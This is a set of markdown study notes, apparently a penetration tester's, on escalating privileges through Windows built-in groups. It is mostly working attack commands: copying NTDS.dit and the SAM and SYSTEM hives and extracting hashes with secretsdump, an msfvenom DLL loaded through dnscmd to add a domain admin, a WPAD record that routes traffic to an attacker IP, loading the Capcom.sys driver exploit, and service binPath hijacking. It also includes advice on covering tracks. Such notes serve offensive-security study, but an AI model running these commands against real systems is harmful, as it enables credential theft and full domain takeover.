---
tags: [privesc, windows, groups]
aliases: [Windows Groups]
---
Users are often the weakest link in an organization. We should gather as much information about them as possible.

```cmd
# find logged-in users
query user

# current user
echo %USERNAME%%

# current user privileges - should be run privileged
whoami /priv

# current user group
whoami /groups

# get all users
net user

# get all groups
net localgroup

# details about a group
net localgroup administrators

# get password policy and other
net accounts
```

# Backup Operators

Membership of this groups grants it members the SeBackup and SeRestore privileges. SeBackup allows full disk traversal and list any folder contents even if access has not been allowed. We must use the `FILE_FLAG_BACKUP_SEMANTICS` flag to do so, using this [PoC](https://github.com/giuliano108/SeBackupPrivilege)

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# verify the privilege is enabled
Get-SeBackupPrivilege

# enabling it
Set-SeBackupPrivilege

# copying a file
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

If we have access to the domain controller we can target the AD database using `NTDS.dit`. We can create a shadow copy of it as it is usually locked by default.
```powershell
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit


# we can then bypass the ACL with
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# the privilege also allows us to backup the SAM and SYSTEM registry hives
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

Once downloaded, we can retrieve them via the DSInternals module
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Or SecretsDump.py
```shell
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

Robocopy, a built-in CLI directory replication tool,  can be used to copy files as well. 
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

# Event Log Readers

Organizations enable logging of process command lines to help defenders monitor and identify possibly malicious behavior.

Event Log Reader have permissions to access these logs.

```shell
# confirm membership
net localgroup "Event Log Readers"

# searching security logs
wevtutil qe Security /rd:true /f:text | Select-String "/user"

# pass credentials
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

> Searching the `Security` event log with `Get-WinEvent` requires administrator access or permissions  on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`

```powershell
# security logs
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

# DnsAdmins

Access to DNS information on the network. Windows DNS support custom plugins and can call function from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The service runs as SYSTEM. 

```shell
# create a malicious dll to add a user to the domain admins group
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# loading dll as non-privileged user
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# loading dll as DnsAdmins member
Get-ADGroupMember -Identity DnsAdmins

```

Only the DnsAdmins can use the `dnscmd` utility. The DLL will be loaded the next time the DNS service is started. Group members cannot restart the DNS service.

```shell
# check current SID
wmic useraccount where name="netadm" get sid

# check permissions on DNS service
sc.exe sdshow DNS

# stop the service
sc stop dns

# start
sc start dns
```

Making configurations changes is quite destructive, we must clean up our tracks after exploiting. The following must be done from an elevated console.

```shell
# confirm the ServerLevelPluginDll registry key exists
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# delete it
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

# start dns
sc.exe start dns

# check status
sc query dns
```

It is also possible to use `mimilib.dll` to gain command execution by modifying the `kdns.c` file.

We can also create a WPAD record, since the group allows us to disable global query block security, which blocks this attack. Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are vulnerable to hijacking. 

After disabling the block list we can proxy all through our attacking machine. 

```shell
# disable the block list
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

# adding a WPAD record
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

# Hyper-V Administrators

Full access to all Hyper-V features. In the case where DCs have been virtualized then the virtualization admins are Domain Admins.  They can clone the DC and mount the virtual disk offline to obtain the NTDS.dit. 

We can take an advantage of an application on the server that has installed a service running in the context of SYSTEM.
```shell
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

# replace the file with a malicious one then
sc.exe start MozillaMaintenance
```

> Has been patched for builds after March 2020.
# Print Operators

Grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printer connected to a Domain Controller, as well as the ability to logon to a DC and shut it down. Often times the privilege will not be shown from a unelevated context, so we must [bypass UAC](https://github.com/hfiref0x/UACME) or start it elevated. 

The `Capcom.sys` driver contains functionality to allow any user to execute shellcode with SYSTEM. We can load this driver and escalate privileges with this [tool](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp). 

We must paste over the includes

```c#
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

And then compile from a Visual Studio 2019 Developer command prompt.
```shell
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

# download the driver and add a reference to it
## \??\ is used to reference the driver's ImagePath as an NT Object Path
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

# verify the driver is not loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

# verify the privilege
EnableSeLoadDriverPrivilege.exe

# exploit
.\ExploitCapcom.exe
```
We can also do a similar attack if we have no GUI access by modifying the PoC code.

```C
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

And replace the shell with a reverse shell binary.

We can also automate the steps with [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/). 
```shell
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

We should remove the registry files afterword

```shell
reg delete HKCU\System\CurrentControlSet\Capcom
```

# Server Operators

Allows members to administer Windows server without needing assignment of Domain Admin privileges. Are given the `SeBackupPrivilege` and `SeRestorePrivilege` and can control local services.

Using PsService we can check permissions on service.

```shell
c:\Tools\PsService.exe security AppReadiness
```

Indeed we'll see that the Server Operators group has the SERVICE_ALL_ACCESS access right.

We can then change the binary path to execute a command adding our own user to the local administrators.

```shell
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

# then start the service
sc start AppReadiness
```

## Related

- [[windows-old]]
- [[other|Other Privesc]]
- [[credential-enumeration]]
- [[local-admin]]

